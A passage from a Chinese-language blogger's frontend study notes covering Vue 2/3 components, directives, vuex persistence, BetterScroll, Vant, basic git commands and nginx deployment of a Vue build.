   ```

   CSS 属性 `background-size: cover;` 可以使背景图片自动缩放和裁剪到完全覆盖背景区域。具体表现为：

   - 如果背景图片比背景区域更宽或更高，那么 `background-size: cover;` 属性值会自动适应并缩小图片，以便完全覆盖整个背景区域。
   - 如果背景图片比背景区域更小或比例不对，那么 `background-size: cover;` 属性值会自动按比例拉伸图片，并裁剪多余的部分，以便完全覆盖背景区域。 该属性通常用于自适应响应式设计，可以使背景始终完全填充背景区域，在不同设备和屏幕尺寸下都有良好的显示效果。用法示例：

   ```css
   .background {
     background-image: url(my-background-image.jpg);
     background-size: cover;
   }
   ```
8. 轮播图父传子会出现的bug：

   - `<detail-swiper :perview="2">`，不同的组件中的props值不同，但是界面显示的并没有实现
   - 解决方案：`new Swiper`的类名使用动态的

     ```js
     <div class="swiper-container" :class="name">
     
     mounted() {
         new Swiper("." + this.name, {
           slidesPerView: this.perview,
           spaceBetween: 30,
           freeMode: true,
         });
       },
     ```
9. 指令的最佳实践，根据滚动的距离，对绑定的tag进行隐藏和显示

   ```js
   Vue.directive("scroll", {
     inserted(el, binding) {
       // el是绑定在谁身上，就拿到谁的dom节点
       // console.log(el, binding);
       el.style.display = "none";
   
       window.onscroll = () => {
         if (
           (document.documentElement.scrollTop || document.body.scrollTop) >
           binding.value
         ) {
           el.style.display = "block";
         } else {
           el.style.display = "none";
         }
       };
     },
   
     // 销毁执行
     unbind() {
       window.onscroll = null;
     },
   });
   ```
10. 利用 `better-scroll`进行滚动优化
11. 限制浏览器滚动

    ```css
    .box {
      height: 300px;
      overflow: hidden;
    }
    ```
12. 防止初始化过早

    ```js
    mounted() {
        http({
          url: "/gateway?cityId=440300&ticketFlag=1&k=4312294",
          headers: {
            "X-Host": "mall.film-ticket.cinema.list",
          },
        }).then((res) => {
          console.log(res.data.data.cinemas);
          this.cinemaList = res.data.data.cinemas;
    
          this.$nextTick(() => {
            new BetterScroll(".box");
          });
        });
      },
    ```
13. BetterScroll增加滚动bar，fade：自动隐藏

    ```js
    new BetterScroll(".box", {
              scrollbar: {
                fade: true,
              },
            });
    ```
14. 修正滚动条的位置：`position: relative`
15. 通过给组件加 `ref`，获取当前组件中tag的 `offsetHeight`

    ```
    <tabbar ref="mytabbar"></tabbar>
    
    mounted() {
        console.log(111111, this.$refs.mytabbar.$el.offsetHeight);
        }
    ```
16. 组件库

    1. element-ui：PC端，饿了吗团队推出
    2. vant：移动端，有赞技术团队推出

       - 使用下述代码，可以全局初始化Vant，不需要再引入组件

         ```
         import Vant from "vant";
         import "vant/lib/index.css";
         Vue.use(Vant);
         ```
17. 数据懒加载：直接用vant的列表

    - 详情页面返回会出现 **触发到底的事件**，这是因为onLoad是瞬间执行的，而mounted中的axios是异步等待返回结果的
    - 为了解决上述问题，则需要onLoad函数中的【总长度匹配禁用懒加载】的total（从axios请求返回的值）不为0，即等待axios加载完了之后再走这一部分逻辑

      ```js
      if (this.datalist.length === this.total && this.total != 0) {
              this.finished = true;
              return;
            }
            console.log("到底了");
            this.current++;
      ```
18. loading框：在axios加载数据完毕后消失，在发请求之前加载，在发请求之后关闭

    ```js
    import axios from "axios"
    import { Toast } from "vant";


    const http = axios.create({
        baseURL: "https://m.maizuo.com",
        timeout: 10000,
        headers: {
            "X-Client-Info":
                '{"a":"3000","ch":"1002","v":"5.2.1","e":"1689149181904756335738881"}',
            // "X-Host": "mall.film-ticket.film.list",
        },
    })
    
    // 添加请求拦截器
    http.interceptors.request.use(function (config) {
        // 在发送请求之前做些什么
        Toast.loading({
            message: "加载中...",
            forbidClick: true,
            duration: 0,
        });
        return config;
    }, function (error) {
        // 对请求错误做些什么
        return Promise.reject(error);
    });
    
    // 添加响应拦截器
    http.interceptors.response.use(function (response) {
        // 对响应数据做点什么
    
        // 隐藏加载
        Toast.clear();
        return response;
    }, function (error) {
        // 对响应错误做点什么
        return Promise.reject(error);
    });
    ```
19. 传统的多页面跳转方案：

    - `location.href = '#/cinemas?cityname=' + item.name`
    - cookie、localStorage
20. 单页面方案

    - 中间人模式
    - bus事件总线方案：`$on`、`$emit`

## 11. vuex

1. 状态管理模式，管理公共状态，保存到内存里，刷新就没了（浏览器的设置）

   ![](https://vuex.vuejs.org/vuex.png)
2. [vue-devtools最新版本安装教程（vue-devtools6.5.0）](https://blog.csdn.net/weixin_44315181/article/details/131580858)
3. vue-devtools 5.1.1为教程版本
4. vuex可以管理保存公共状态（分散在各个组件内的状态，统一管理）
5. vuex默认是管理在内存中，一刷新页面，公共状态就丢失了
6. vuex 项目应用

   - 非父子的通信
   - 后端数据的缓存快照，减少重复数据请求，减轻服务器压力，提高用户体验
7. mutations中不支持异步，只能支持同步；能支持异步和同步的是actions
8. 注意：

   1. 应用层级的状态应该集中到单个store对象中
   2. 提交mutation是更改状态的唯一方法，并且这个过程是同步的
   3. 异步逻辑都应该封装到action里面
9. vuex的第二种写法

   - state：单一状态树，每个应用将仅仅包含一个store实例

     - `this.$store.state.状态名字`
     - `...mapState(["title"])`

       ```
       computed: {
           ...mapState(["cinemaList"]),
         },
       // 或者
       computed: mapState(["cinemaList"]),
       
         // 使用
         this.cinemaList
       ```

       - `mapState`：函数返回的是store.state的对象
       - 然后使用 `...` 可以解构结构体（解构字典）
     - `mapActions`、`mapMutations`同理，不过不是放在computed中，而是放在methods中
10. 底部选项卡控制

    1. 普通实现：在mounted时提交修改 v-show 的变量为false的mution；在destoryed时提交修改 v-show 的变量为true 的mution
    2. 混入实现：mixin，建一个对象，将上述过程中的mounted/created/destoryed写入改对象中，然后将改对象混入其中

       ```js
       export default {
       	mixins: [obj],
       	data(){},
       	mounted(){},
       	...
       }
       ```
11. vuex的持久化

    1. `vuex-persistedstate`
    2. 下载：`cnpm i --save vuex-persistedstate`
    3. 使用：

       - 在 `store/index.js` 中导入：`import createPersistedState from 'vuex-persistedstate'`
       - 在 `Vuex.Store` 中增加插件 `plugins: [createPersistedState()],`
    4. 原理：每次存的时候，都会在localstorage中存一份
    5. 默认是 localstorage，可以改为别的，比如 `window.sessionStorage`；默认是全部存储，可以通过 方法 `reducer` 只存储state中的部分数据

       ```js
       export default new Vuex.Store({
         plugins: [createPersistedState({
           reducer: (state) => {
             return {
               cityId: state.cityId,
               cityName: state.cityName
             }
           }
         })],
         ...
       )}
       ```

## 12. git

1. 代码管理工具

   1. 传统：u盘，app，飞秋，compare
   2. svn，集中式代码管理工具
   3. git，分布式代码管理工具

   ![在这里插入图片描述](https://img-blog.csdnimg.cn/d5c447f3a41241c989689f0ab4e01159.png)
   
2. `git init`：初始化本地仓库

3. `git add`：代码区 -> 暂存区

4. `git commit`：暂存区 -> 本地仓库

5. `git log`：查看提交记录

6. `git reset --hard HEAD^`：回退上一个版本，两个^就是回退两个版本

7. `git reflog`：操作记录

8. `git reset --hard 六位版本号`：回退指定版本（**可根据操作记录进行后悔**）

9. `git diff 文件名`：查看当前代码和仓库中的代码有何不同

10. `git branch -a`：查看所有分支

11. `git checkout -b 分支名`：创建新分支并切换

12. `git checkout 分支`：切换到分支

13. `git push origin 分支`：推送分支到远程仓库分支

14. `git push origin master:分支`：推送master到远程的分支

14. `git push origin 分支:分支`：推送分支到远程的分支

14. `git push origin :分支`：删除远程的分支

14. `git branch -d 分支`：删除本地的分支

18. `git merge 分支`：将分支合并到主分支

15. `git remote add origin 远程Git仓库地址`：将本地项目连接到远程的git仓库

## 13. nginx

1. nginx：高性能反向代理服务器
2. vue项目部署流程
   1. `npm run build`：vue文件输出
   2. 将 `build` 文件夹拷贝到nginx目录下
   3. 进入 `conf` 复制一份nginx.conf，并重命名，修改配置中的 server 中的 location 中的 `root dist` ，这个dist就是目标路径
3. `nginx.exe -c .\conf\liyingjun.conf`：启动nginx
4. `nginx.exe -s stop`：停止
5. `nginx.exe -s reload`：重启
5. 配置好了，可以直接带着nginx复制到服务器上运行

## 14. Vue3的组合式api

1. 注册和挂载不一样，vue3使用了createApp

2. 路由使用createRouter函数
   1. `createWebHistory`：斜杠路由模式，history模式
   2. `createWebHashHistory`：#路由模式，hash模式
   
3. vuex同上，使用createStore

4. **组合式API**：react 类和函数写法（不支持状态，生命周期等，支持属性） ——》 react hooks（钩住函数写法的状态） ——》 vue3-hooks（即：composition api，见不到this了）
   
   1. `setup`：代替了vue3老写法或者vue2写法中，`beforeCreate` 和 `created` 生命周期
   
   2. `reactive`：创建响应式对象，类似模板中的状态（如果参数是字符串、数字会报警告）
   
   3. 如果同时使用 老式的 `data(){}` 和 组合式的 `setup(){}` ，定义的变量和生命周期会同时生效
      - 在 `setup` 中没有this
      - 两套东西不建议混用
      - `reactive`：可以写多个
   
   4. template里可以写多个div 兄弟节点
   
   5. `ref`：
   
      - 过去 vue2中 dom 的引用
   
        ```
        <input type="text" ref="mytextref">
        
        mounted() {
                console.log("mounted", this.$refs.mytextref);
        },
        ```
   
      - 在新版vue3中，同样可以获取dom对象，但是需要通过 `.value` 拿到dom对象
   
        ```
        const mytextref = ref()
        
        return {
                    mytextref
                }
        ```
   
      - 在新版vue3中，通过ref跟踪变量，从而对组件进行赋值
   
        ```vue
        <template>
            <div>
                <input type="text" ref="mytext">
                <button @click="handleAdd">add</button>
        
                <ul>
                    <li v-for="data in datalist" :key="data">
                        {{ data }}
                    </li>
                </ul>
            </div>
        </template>
        
        <script>
        import { ref } from "vue";
        export default {
            setup() {
                const mytext = ref()
                const datalist = ref([111, 222])
        
                const handleAdd = () => {
                    console.log(mytext.value.value);
                    datalist.value.push(mytext.value.value)
                    mytext.value.value = ''
                }
        
                return {
                    handleAdd,
                    mytext,
                    datalist
                }
            }
        }
        </script>
        ```
   
   6. `toRefs`：解决 `ref` 和 `reactive` 的最佳实践，reactive可以自动展开，但是不支持简单类型（int、str啥的）；ref啥都能用，但是不能自动展开，很难受。【但是】toRefs可以支持：
   
      - 定义阶段：使用 reative
   
      - return阶段：使用 `..toRefs()`，将变量解包为多个ref对象
   
      - 直接取长补短，我愿称之为绝杀
   
        ```vue
        <template>
            <div>
                {{ myname }}
                <button @click="handleClick">change</button>
            </div>
        </template>
        
        <script>
        import { reactive, toRefs } from 'vue'
        export default {
            setup() {
                console.log("setup");
        
                // 定义状态
                const obj = reactive({
                    myname: "kerwin",
                    myage: 100
                })
                const handleClick = () => {
                    obj.myname = "liyingjun"
                }
        
                return {
                    handleClick,
                    ...toRefs(obj)
                }
            }
        }
        </script>
        ```
   
   7. `props`：父传子解决方案
   
      1. 定义一个组件，接受参数 props
   
         ```vue
         <template>
             <div>
                 <button>left</button>
                 navbar -- {{ myname }}
                 <button>right</button>
             </div>
         </template>
         
         <script>
         export default {
             props: ["myname"]
         }
         </script>
         ```
   
      2. 主界面使用组件，传入参数
   
         ```vue
         <template>
             <div>
                 通信
                 <navbar myname="home"></navbar>
             </div>
         </template>
         
         <script>
         import navbar from './components/navbar'
         export default {
             components: {
                 navbar
             }
         }
         </script>
         ```
   
      3. 如果是在mounted中想要拿到这个值，或者是在setup中想要处理逻辑中包含这个值，常见的vue2和vue3写法如下
   
         ```
         mounted() {
                 console.log("222", this.myid);
             },
         
         setup(props) {
         	console.log(props.myid);
         }
         ```
   
         - setup默认传入第一个参数就是props的list
         - setup比mounted的调用时间要早
   
   8. `emit`：子传父解决方案
   
      1. 触发的来源组件中，定义触发的函数，函数体内写 `emit` ，传参对应的事件名
   
         ```vue
         <template>
             <div>
                 <button @click="handleShow">left</button>
                 navbar -- {{ myname }}
                 <button>right</button>
             </div>
         </template>
         
         <script>
         export default {
             props: ["myname", "myid"],
             mounted() {
                 console.log("222", this.myid);
             },
         
             setup(props, { emit }) {
                 console.log(props.myid);
         
                 const handleShow = () => {
                     emit("event")
                 }
         
                 return {
                     handleShow
                 }
             }
         }
         </script>
         ```
   
      2. 在被影响的组件，一般是主页的组件上，给调用触发组件的 dom 上定义事件名及其绑定的函数名，在script中编写函数的具体实现
   
         ```vue
         <template>
             <div>
                 通信
                 <navbar myname="home" myid="111" @event="change"></navbar>
                 <sidebar v-show="obj.isShow"></sidebar>
             </div>
         </template>
         
         <script>
         import navbar from './components/navbar'
         import sidebar from './components/sidebar'
         import { reactive } from "vue";
         export default {
             components: {
                 navbar,
                 sidebar
             },
         
             setup() {
                 const obj = reactive({
                     isShow: true
                 })
         
                 const change = () => {
                     obj.isShow = !obj.isShow
                 }
         
                 return {
                     obj,
                     change
                 }
             }
         }
         </script>
         ```
   
      3. 选要注意的是，在vue2中 调用触发 的组件中，`emit`的写法是 `this.$emit()`，而在vue3中，类似props传参一样，第二个参数默认为闭包的 `emit`，所以第二个参数以 解包 的形式 获取 emit：`setup(props, { emit }) {...}`
   
   9. 生命周期


















---

- ☁️ 我的CSDN：`https://blog.csdn.net/qq_21579045/`
- ❄️ 我的博客园：`https://www.cnblogs.com/lyjun/`
- ☀️ 我的Github：`https://github.com/TinyHandsome/`
- 🌈 我的bilibili：`https://space.bilibili.com/8182822/`
- 🥑 我的思否：`https://segmentfault.com/u/liyj/`
- 🍅 我的知乎：`https://www.zhihu.com/people/lyjun_/`
- 🥔 我的豆瓣：`https://www.douban.com/people/lyjun_/`
- 🐧 粉丝交流群：1060163543，神秘暗号：为干饭而来

碌碌谋生，谋其所爱。🌊              @李英俊小朋友
